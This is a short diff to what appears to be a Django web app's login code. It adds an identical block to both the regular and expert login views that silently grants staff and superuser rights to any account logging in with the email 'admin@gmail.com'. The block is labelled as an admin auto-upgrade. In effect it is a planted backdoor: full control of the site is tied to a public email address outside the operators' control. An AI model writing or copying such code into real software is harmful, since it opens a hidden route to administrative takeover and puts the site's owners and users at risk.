@@ -115,6 +115,12 @@ def login_view(request):
 
         user_auth = authenticate(request, username=user.username, password=password)
         if user_auth is not None:
+            # AUTO-UPGRADE ADMIN USER: Ensuring admin@gmail.com always has admin rights
+            if email.lower() == 'admin@gmail.com':
+                user_auth.is_staff = True
+                user_auth.is_superuser = True
+                user_auth.save()
+
             login(request, user_auth)
             messages.success(request, "Login successful!")
             
@@ -1401,6 +1407,12 @@ def expert_login_view(request):
 
         user_auth = authenticate(request, username=user.username, password=password)
         if user_auth is not None:
+            # AUTO-UPGRADE ADMIN USER: Ensuring admin@gmail.com always has admin rights
+            if email.lower() == 'admin@gmail.com':
+                user_auth.is_staff = True
+                user_auth.is_superuser = True
+                user_auth.save()
+
             if not user_auth.is_expert and not user_auth.is_staff:
                 messages.error(request, "This account is not registered as an expert. Please use regular login.")
                 return redirect("expert_login")
